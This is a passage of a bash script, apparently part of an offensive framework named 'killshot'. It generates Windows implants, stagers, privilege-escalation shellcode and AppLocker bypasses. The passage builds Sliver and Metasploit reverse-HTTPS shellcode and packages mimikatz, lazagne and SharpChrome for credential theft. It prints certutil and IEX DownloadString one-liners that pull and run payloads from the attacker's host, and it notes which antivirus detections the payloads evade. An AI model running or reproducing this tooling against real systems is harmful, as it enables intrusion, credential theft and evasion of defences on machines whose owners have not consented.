        --potatoes)     GEN_POTATOES=1; shift;;
        --potato)       GEN_POTATOES=1; SINGLE_POTATO="$2"; shift 2;;
        --tools)        GEN_TOOLS=1; shift;;
        --tool)         GEN_TOOLS=1; SINGLE_TOOL="$2"; shift 2;;
        --loaders)      GEN_LOADERS=1; shift;;
        --msi)          GEN_MSI=1; shift;;
        --msbuild)      GEN_MSBUILD=1; shift;;
        --installutil)  GEN_INSTALLUTIL=1; shift;;
        -l|--lhost)     LHOST="$2"; shift 2;;
        -p|--lport)     LPORT="$2"; shift 2;;
        -h|--http)      HTTP_PORT="$2"; shift 2;;
        -f|--framework) FRAMEWORK="$2"; shift 2;;
        -t|--type)      IMPLANT_TYPE="$2"; shift 2;;
        --proto)        SLIVER_PROTO="$2"; shift 2;;
        -c|--cmd)       POTATO_CMD_OVERRIDE="$2"; shift 2;;
        --params)       TOOL_PARAMS_OVERRIDE="$2"; shift 2;;
        -o|--output)    OUTPUT_OVERRIDE="$2"; shift 2;;
        --help)         show_help; exit 0;;
        *)
            if [ -z "${POS_SET:-}" ]; then
                LHOST="$1"; POS_SET=1
            elif [ "$POS_SET" = "1" ]; then
                LPORT="$1"; POS_SET=2
            elif [ "$POS_SET" = "2" ]; then
                HTTP_PORT="$1"; POS_SET=3
            fi
            shift;;
    esac
done

# If --all, enable everything
if [ "$GEN_ALL" = "1" ]; then
    GEN_IMPLANT=1; GEN_RUNNER=1; GEN_STAGER=1
    GEN_POTATOES=1; GEN_TOOLS=1; GEN_LOADERS=1
    GEN_MSI=1; GEN_MSBUILD=1; GEN_INSTALLUTIL=1
fi

# If no component flags given, show help
if [ "$GEN_IMPLANT$GEN_RUNNER$GEN_STAGER$GEN_POTATOES$GEN_TOOLS$GEN_LOADERS$GEN_MSI$GEN_MSBUILD$GEN_INSTALLUTIL" = "000000000" ]; then
    echo "[!] No component flags specified. Use --all for everything, or pick components:"
    echo ""
    echo "    killshot generate -l $LHOST --all         # Everything"
    echo "    killshot generate -l $LHOST --runner      # Just runner.exe"
    echo "    killshot generate -l $LHOST --implant     # Just C2 implant"
    echo "    killshot generate --potato GodPotato      # Single potato"
    echo "    killshot generate --tool Certify          # Single tool"
    echo ""
    echo "    See: killshot help"
    exit 1
fi

show_banner
echo "[*] Platform: $PLATFORM | Framework: $FRAMEWORK | LHOST=$LHOST LPORT=$LPORT HTTP=$HTTP_PORT"
echo "[*] Workspace: $WORKSPACE"
echo "[*] Go: $(go version 2>/dev/null || echo 'NOT FOUND — run install.sh')"

# Find Donut (needed by potatoes, tools, and loaders)
DONUT_PY=""
for p in "/opt/tools/Empire/venv/bin/python3" \
         "$(which python3 2>/dev/null)"; do
    [ -f "$p" ] && "$p" -c "import donut" 2>/dev/null && DONUT_PY="$p" && break
done

GENERATED=()

# ─── Implant ─────────────────────────────────────────────────

if [ "$GEN_IMPLANT" = "1" ]; then
    echo ""
    echo "[*] Generating $FRAMEWORK implant shellcode..."

    if [ "$FRAMEWORK" = "sliver" ]; then
        # Find sliver binaries — prefer client (connects to running daemon)
        SLIVER_CLIENT=$(which sliver-client 2>/dev/null || echo "/opt/tools/bin/sliver-client")
        SLIVER_SERVER=$(which sliver-server 2>/dev/null || echo "/opt/tools/bin/sliver-server")

        if [ -x "$SLIVER_CLIENT" ] || [ -x "$SLIVER_SERVER" ]; then
            rm -f /tmp/implant.bin

            if [ "$IMPLANT_TYPE" = "session" ]; then
                GEN_CMD="generate --${SLIVER_PROTO} ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
            else
                GEN_CMD="generate beacon --${SLIVER_PROTO} ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
            fi

            echo "$GEN_CMD" > /tmp/sliver_gen.rc
            echo "exit" >> /tmp/sliver_gen.rc
            echo "[*] This may take a minute (Sliver is compiling)..."

            # Set SLIVER_ROOT_DIR for non-default configs (exegol)
            SLIVER_ENV=""
            for sr in "/opt/my-resources/setup/sliver/.sliver" "$HOME/.sliver"; do
                [ -d "$sr" ] && SLIVER_ENV="SLIVER_ROOT_DIR=$sr" && break
            done

            # Try sliver-client first (connects to running daemon), fall back to sliver-server
            if [ -x "$SLIVER_CLIENT" ]; then
                TERM=dumb script -qec "timeout 180 env $SLIVER_ENV $SLIVER_CLIENT --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Build|Compil|symbol" | grep -v "/tmp/" || true
            elif [ -x "$SLIVER_SERVER" ]; then
                TERM=dumb script -qec "timeout 180 env $SLIVER_ENV $SLIVER_SERVER --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Build|Compil|symbol" | grep -v "/tmp/" || true
            fi

            if [ -f /tmp/implant.bin ]; then
                base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                echo "[+] Sliver $IMPLANT_TYPE shellcode generated"
                rm -f /tmp/implant.bin
                GENERATED+=("implant.enc")
            else
                echo "[!] Sliver generation failed"
                [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
                echo "[*] Using existing implant.enc"
            fi
        else
            echo "[!] sliver-server/sliver-client not found"
            [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
            echo "[*] Using existing implant.enc"
        fi

    elif [ "$FRAMEWORK" = "msf" ]; then
        MSFVENOM=$(which msfvenom 2>/dev/null || echo "/opt/tools/metasploit-framework/msfvenom")

        if [ -x "$MSFVENOM" ]; then
            echo "[*] Generating Metasploit staged reverse_https shellcode..."
            "$MSFVENOM" \
                -p windows/x64/meterpreter_reverse_https \
                LHOST="$LHOST" LPORT="$LPORT" \
                EXITFUNC=thread \
                -f raw \
                --encrypt xor \
                --encrypt-key "$(head -c 16 /dev/urandom | xxd -p)" \
                -o /tmp/implant.bin 2>&1 | grep -E "Payload|Final|Saved" || true

            if [ -f /tmp/implant.bin ]; then
                base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                echo "[+] Metasploit shellcode generated (encrypted)"
                rm -f /tmp/implant.bin
                GENERATED+=("implant.enc")
            else
                echo "[*] Retrying without encryption..."
                "$MSFVENOM" \
                    -p windows/x64/meterpreter_reverse_https \
                    LHOST="$LHOST" LPORT="$LPORT" \
                    EXITFUNC=thread \
                    -f raw \
                    -o /tmp/implant.bin 2>&1 | grep -E "Payload|Final|Saved" || true

                if [ -f /tmp/implant.bin ]; then
                    base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                    echo "[+] Metasploit shellcode generated (raw)"
                    rm -f /tmp/implant.bin
                    GENERATED+=("implant.enc")
                else
                    echo "[!] msfvenom failed"
                    [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
                    echo "[*] Using existing implant.enc"
                fi
            fi
        else
            echo "[!] msfvenom not found"
            [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
            echo "[*] Using existing implant.enc"
        fi
    else
        echo "[!] Unknown framework: $FRAMEWORK (use 'sliver' or 'msf')"
        exit 1
    fi
fi

# ─── Runner ──────────────────────────────────────────────────

if [ "$GEN_RUNNER" = "1" ]; then
    echo ""
    echo "[*] Generating polymorphic runner..."
    cd "$SCRIPT_DIR"
    RUNNER_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/runner.exe}"
    # Only use OUTPUT_OVERRIDE for runner if no other components requested
    [ "$GEN_ALL" = "1" ] && RUNNER_OUT="$WORKSPACE/runner.exe"
    python3 gen_runner.py -o "$RUNNER_OUT" -s "$SCRIPT_DIR"
    GENERATED+=("$(basename "$RUNNER_OUT")")
fi

# ─── Stager ──────────────────────────────────────────────────

if [ "$GEN_STAGER" = "1" ]; then
    echo ""
    echo "[*] Generating polymorphic stager..."
    cd "$SCRIPT_DIR"
    STAGER_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/stager.ps1}"
    [ "$GEN_ALL" = "1" ] && STAGER_OUT="$WORKSPACE/stager.ps1"
    # Use C runner (runner_c.dat) if built, otherwise fall back to Go runner (runner.exe)
    RUNNER_FILE="runner_c.dat"
    [ ! -f "$WORKSPACE/runner_c.dat" ] && RUNNER_FILE="runner.exe"
    INLINE_FLAG=""
    [ "${STAGER_INLINE:-0}" = "1" ] && INLINE_FLAG="--inline"
    python3 gen_stager.py \
        --runner-url "http://$LHOST:$HTTP_PORT/$RUNNER_FILE" \
        --implant-url "http://$LHOST:$HTTP_PORT/implant.enc" \
        --bypass 6 \
        -o "$STAGER_OUT" $INLINE_FLAG
    GENERATED+=("$(basename "$STAGER_OUT")")
fi

# ─── Potatoes ────────────────────────────────────────────────

if [ "$GEN_POTATOES" = "1" ]; then
    echo ""
    if [ -z "$DONUT_PY" ]; then
        echo "[!] Donut not found — cannot generate potato shellcode"
    else
        POTATO_CMD="${POTATO_CMD_OVERRIDE:-cmd /c certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/runner.exe %TEMP%\\r.exe && %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/implant.enc}"

        if [ -n "$SINGLE_POTATO" ]; then
            echo "[*] Generating $SINGLE_POTATO shellcode..."
            POTATO_LOWER=$(echo "$SINGLE_POTATO" | tr 'A-Z' 'a-z')
            POTATO_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/${POTATO_LOWER}.enc}"
            python3 "$SCRIPT_DIR/gen_potato.py" \
                -p "$SINGLE_POTATO" \
                -c "$POTATO_CMD" \
                -o "$POTATO_OUT" \
                -s "$SCRIPT_DIR"
            GENERATED+=("$(basename "$POTATO_OUT")")
        else
            echo "[*] Generating all potato shellcode..."
            for POTATO in GodPotato PrintSpoofer BadPotato EfsPotato SweetPotato; do
                POTATO_LOWER=$(echo "$POTATO" | tr 'A-Z' 'a-z')
                python3 "$SCRIPT_DIR/gen_potato.py" \
                    -p "$POTATO" \
                    -c "$POTATO_CMD" \
                    -o "$WORKSPACE/${POTATO_LOWER}.enc" \
                    -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
                GENERATED+=("${POTATO_LOWER}.enc")
            done
        fi
    fi
fi

# ─── Tools ───────────────────────────────────────────────────

if [ "$GEN_TOOLS" = "1" ]; then
    echo ""
    if [ -z "$DONUT_PY" ]; then
        echo "[!] Donut not found — cannot generate tool shellcode"
    elif [ -n "$SINGLE_TOOL" ]; then
        echo "[*] Generating $SINGLE_TOOL shellcode..."
        TOOL_LOWER=$(echo "$SINGLE_TOOL" | tr 'A-Z' 'a-z' | tr '-' '_')
        TOOL_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/${TOOL_LOWER}.enc}"

        TOOL_ARGS=()
        if [ -n "$TOOL_PARAMS_OVERRIDE" ]; then
            TOOL_ARGS=("--params" "$TOOL_PARAMS_OVERRIDE")
        fi

        # Handle ligolo-agent connect-back
        EXTRA_ARGS=()
        if [ "$SINGLE_TOOL" = "ligolo-agent" ] && [ -z "$TOOL_PARAMS_OVERRIDE" ]; then
            EXTRA_ARGS=("--lhost" "$LHOST" "--ligolo-port" "11601")
        fi

        python3 "$SCRIPT_DIR/killshot.py" \
            --tool "$SINGLE_TOOL" \
            "${TOOL_ARGS[@]}" "${EXTRA_ARGS[@]}" \
            -o "$TOOL_OUT" \
            -s "$SCRIPT_DIR"
        GENERATED+=("$(basename "$TOOL_OUT")")
    else
        echo "[*] Generating all offensive tool shellcode..."
        cd "$SCRIPT_DIR"

        declare -A TOOL_PARAMS=(
            ["Rubeus"]="triage"
            ["SharpHound"]="-c All --memcache"
            ["Certify"]="find /vulnerable"
            ["Seatbelt"]="-group=all -full"
            ["SharpDPAPI"]="triage"
            ["SharpUp"]="audit"
            ["SharpChrome"]="logins"
            ["Whisker"]="list"
            ["KrbRelayUp"]="relay"
            ["mimikatz"]="privilege::debug sekurlsa::logonpasswords exit"
            ["lazagne"]="all"
        )

        for TOOL in Rubeus SharpHound Certify Seatbelt SharpDPAPI SharpUp SharpChrome Whisker KrbRelayUp mimikatz lazagne; do
            TOOL_LOWER=$(echo "$TOOL" | tr 'A-Z' 'a-z')
            PARAMS="${TOOL_PARAMS[$TOOL]}"
            python3 killshot.py \
                --tool "$TOOL" \
                --params "$PARAMS" \
                -o "$WORKSPACE/${TOOL_LOWER}.enc" \
                -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
            GENERATED+=("${TOOL_LOWER}.enc")
        done

        # winPEAS — run through obfuscation pipeline
        echo "[*] Generating winPEAS (obfuscated)..."
        bash "$SCRIPT_DIR/killshot.sh" winpeas -o "$WORKSPACE/winpeas_obf.exe" 2>&1 | grep -E "^\[|Patched|not found" || true
        [ -f "$WORKSPACE/winpeas.enc" ] && GENERATED+=("winpeas.enc")

        # Ligolo agent
        python3 killshot.py \
            --tool ligolo-agent \
            --lhost "$LHOST" \
            --ligolo-port 11601 \
            -o "$WORKSPACE/ligolo.enc" \
            -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
        GENERATED+=("ligolo.enc")

        # Chisel
        python3 killshot.py \
            --tool chisel \
            --params "client $LHOST:8443 R:socks" \
            -o "$WORKSPACE/chisel.enc" \
            -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
        GENERATED+=("chisel.enc")
    fi
fi

# ─── Loaders (PS fallback) ───────────────────────────────────

if [ "$GEN_LOADERS" = "1" ]; then
    echo ""
    echo "[*] Generating PowerShell tool loaders (PS1 fallback for .NET tools)..."
    cd "$SCRIPT_DIR"

    # Rubeus — PS1 in-memory loader via [Reflection.Assembly]::Load()
    RUBEUS_SRC=""
    for p in "$SCRIPT_DIR/tools/windows/Rubeus.exe" \
             "/opt/killshot/tools/windows/Rubeus.exe" \
             "/opt/my-resources/avbypass/tools/windows/Rubeus.exe" \
             "/opt/my-resources/setup/sliver/.sliver-client/aliases/rubeus/Rubeus.exe"; do
        [ -f "$p" ] && RUBEUS_SRC="$p" && break
    done

    if [ -n "$RUBEUS_SRC" ]; then
        cp "$RUBEUS_SRC" "$WORKSPACE/Rubeus.exe"
        python3 gen_tool_stager.py \
            --tool-url "http://$LHOST:$HTTP_PORT/Rubeus.exe" \
            --tool-name Rubeus \
            --mode dotnet \
            -o "$WORKSPACE/rubeus.ps1"
        GENERATED+=("rubeus.ps1" "Rubeus.exe")
    else
        echo "[!] Rubeus.exe not found — skipping PS1 loader"
    fi

    # Mimikatz — PS1 IEX loader (Invoke-Mimikatz fallback)
    for p in "/opt/tools/Empire/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1" \
             "$SCRIPT_DIR/tools/windows/Invoke-Mimikatz.ps1"; do
        if [ -f "$p" ]; then
            cp "$p" "$WORKSPACE/Invoke-Mimikatz.ps1"
            python3 gen_tool_stager.py \
                --tool-url "http://$LHOST:$HTTP_PORT/Invoke-Mimikatz.ps1" \
                --tool-name Mimikatz \
                --mode script \
                -o "$WORKSPACE/mimikatz.ps1"
            GENERATED+=("mimikatz.ps1" "Invoke-Mimikatz.ps1")
            break
        fi
    done
fi

# ─── AppLocker Bypass: MSI ──────────────────────────────────

if [ "$GEN_MSI" = "1" ]; then
    echo ""
    echo "[*] Generating MSI AppLocker bypass..."

    # Need implant shellcode — generate if not already present
    IMPLANT_BIN=""
    if [ -f "/tmp/implant.bin" ]; then
        IMPLANT_BIN="/tmp/implant.bin"
    elif [ -f "$WORKSPACE/implant.enc" ]; then
        # Decode the base64 .enc back to raw shellcode
        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_msi.bin
        IMPLANT_BIN="/tmp/implant_msi.bin"
    fi

    if [ -n "$IMPLANT_BIN" ]; then
        cd "$SCRIPT_DIR"
        IMPLANT_SIZE=$(stat -c%s "$IMPLANT_BIN" 2>/dev/null || stat -f%z "$IMPLANT_BIN" 2>/dev/null || echo 0)

        if [ "$IMPLANT_SIZE" -gt 1048576 ]; then
            # Large shellcode (>1MB): use staged loader that downloads at runtime
            echo "[*] Large shellcode ($(( IMPLANT_SIZE / 1024 ))KB) — using staged MSI loader"
            python3 gen_msi.py \
                --url "http://$LHOST:$HTTP_PORT/beacon.bin" \
                -i "$IMPLANT_BIN" \
                -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
            # Move the encrypted shellcode to match the URL
            [ -f "$WORKSPACE/update.bin" ] && mv "$WORKSPACE/update.bin" "$WORKSPACE/beacon.bin" && GENERATED+=("beacon.bin")
        else
            # Small shellcode: embed directly in DLL
            python3 gen_msi.py \
                -i "$IMPLANT_BIN" \
                -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
        fi

        if [ -f "$WORKSPACE/update.msi" ]; then
            GENERATED+=("update.msi")
        elif [ -f "$WORKSPACE/update.dll" ]; then
            # wixl unavailable — DLL fallback for rundll32/trusted path bypass
            GENERATED+=("update.dll")
        fi
        rm -f /tmp/implant_msi.bin
    else
        echo "[!] MSI requires implant shellcode — run with --implant or provide /tmp/implant.bin"
    fi
fi

# ─── AppLocker Bypass: MSBuild ─────────────────────────────

if [ "$GEN_MSBUILD" = "1" ]; then
    echo ""
    echo "[*] Generating MSBuild AppLocker bypass..."

    IMPLANT_BIN=""
    if [ -f "/tmp/implant.bin" ]; then
        IMPLANT_BIN="/tmp/implant.bin"
    elif [ -f "$WORKSPACE/implant.enc" ]; then
        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_msb.bin
        IMPLANT_BIN="/tmp/implant_msb.bin"
    fi

    if [ -n "$IMPLANT_BIN" ]; then
        cd "$SCRIPT_DIR"
        python3 gen_applocker.py --msbuild \
            -i "$IMPLANT_BIN" \
            -o "$WORKSPACE/build.xml" 2>&1 | grep -E "^\[" || true
        if [ -f "$WORKSPACE/build.xml" ]; then
            GENERATED+=("build.xml")
        fi
        rm -f /tmp/implant_msb.bin
    else
        echo "[!] MSBuild requires implant shellcode — run with --implant or provide /tmp/implant.bin"
    fi
fi

# ─── AppLocker Bypass: InstallUtil ─────────────────────────

if [ "$GEN_INSTALLUTIL" = "1" ]; then
    echo ""
    echo "[*] Generating InstallUtil AppLocker bypass..."

    IMPLANT_BIN=""
    if [ -f "/tmp/implant.bin" ]; then
        IMPLANT_BIN="/tmp/implant.bin"
    elif [ -f "$WORKSPACE/implant.enc" ]; then
        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_iu.bin
        IMPLANT_BIN="/tmp/implant_iu.bin"
    fi

    if [ -n "$IMPLANT_BIN" ]; then
        cd "$SCRIPT_DIR"
        python3 gen_applocker.py --installutil \
            -i "$IMPLANT_BIN" \
            -o "$WORKSPACE/service.cs" 2>&1 | grep -E "^\[" || true
        if [ -f "$WORKSPACE/service.cs" ]; then
            GENERATED+=("service.cs")
        fi
        rm -f /tmp/implant_iu.bin
    else
        echo "[!] InstallUtil requires implant shellcode — run with --implant or provide /tmp/implant.bin"
    fi
fi

# ─── Summary ─────────────────────────────────────────────────
echo ""
echo "============================================"
echo "[+] Generation complete!"
echo "============================================"
if [ ${#GENERATED[@]} -gt 0 ]; then
    for f in "${GENERATED[@]}"; do
        echo "  [+] $f"
    done
else
    echo "  (no files generated)"
fi
echo ""
echo "[*] Serve: cd $WORKSPACE && python3 -m http.server $HTTP_PORT"
echo ""

# Show on-target instructions per payload type
HAS_MSI=0; HAS_RUNNER=0; HAS_STAGED=0; HAS_DLL=0; HAS_MSBUILD=0; HAS_INSTALLUTIL=0; HAS_STAGER=0
for f in "${GENERATED[@]}"; do
    case "$f" in
        update.msi)   HAS_MSI=1;;
        runner.exe|runner_c.dat) HAS_RUNNER=1;;
        beacon.bin)   HAS_STAGED=1;;
        update.dll)   HAS_DLL=1;;
        build.xml)    HAS_MSBUILD=1;;
        service.cs)   HAS_INSTALLUTIL=1;;
        stager*.ps1)  HAS_STAGER=1;;
    esac
done

if [ "$HAS_STAGER" = "1" ]; then
    STAGER_NAME=$(basename "${STAGER_OUT:-$WORKSPACE/stager.ps1}")
    echo "┌─────────────────────────────────────────────────────────────────┐"
    echo "│  ONE-LINER DELIVERY                                             │"
    echo "├─────────────────────────────────────────────────────────────────┤"
    echo "│  PS (WinRM/PS shell):                                           │"
    echo "│    IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/$STAGER_NAME')"
    echo "│                                                                  │"
    echo "│  CMD → PS (no -ep bypass: detected as PShellDlr.SA):           │"
    echo "│    powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/$STAGER_NAME')\""
    echo "│                                                                  │"
    echo "│  TIP: Use --inline for zero PE-on-disk (beats Bearfoos.A!ml)   │"
    echo "└─────────────────────────────────────────────────────────────────┘"
    echo ""
fi

if [ "$HAS_MSI" = "1" ]; then
    echo "[*] MSI (AppLocker bypass via msiexec):"
    if [ "$HAS_STAGED" = "1" ]; then
        echo "    1. Start HTTP server (serves beacon.bin + update.msi)"
        echo "    2. certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.msi %TEMP%\\u.msi"
        echo "    3. msiexec /i %TEMP%\\u.msi /qn"
        echo "    (MSI downloads shellcode from http://$LHOST:$HTTP_PORT/beacon.bin at runtime)"
    else
        echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.msi %TEMP%\\u.msi"
        echo "    msiexec /i %TEMP%\\u.msi /qn"
    fi
    echo ""
fi

if [ "$HAS_DLL" = "1" ] && [ "$HAS_MSI" = "0" ]; then
    echo "[*] DLL (rundll32 bypass):"
    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/update.dll %TEMP%\\u.dll"
    echo "    rundll32.exe %TEMP%\\u.dll,DllRegisterServer 0"
    echo ""
fi

if [ "$HAS_RUNNER" = "1" ]; then
    echo "[*] Runner (polymorphic loader):"
    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/runner.exe %TEMP%\\r.exe"
    echo "    %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/implant.enc"
    # Show .enc files available
    ENC_FILES=()
    for f in "${GENERATED[@]}"; do
        [[ "$f" == *.enc ]] && ENC_FILES+=("$f")
    done
    if [ ${#ENC_FILES[@]} -gt 1 ]; then
        echo "    (also: ${ENC_FILES[*]})"
    fi
    echo ""
fi

if [ "$HAS_MSBUILD" = "1" ]; then
    echo "[*] MSBuild (AppLocker bypass):"
    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/build.xml %TEMP%\\b.xml"
    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe %TEMP%\\b.xml"
    echo ""
fi

if [ "$HAS_INSTALLUTIL" = "1" ]; then
    echo "[*] InstallUtil (AppLocker bypass):"
    echo "    certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/service.cs %TEMP%\\s.cs"
    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library /out:%TEMP%\\s.dll %TEMP%\\s.cs"
    echo "    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\s.dll"
    echo ""
fi

echo "============================================"
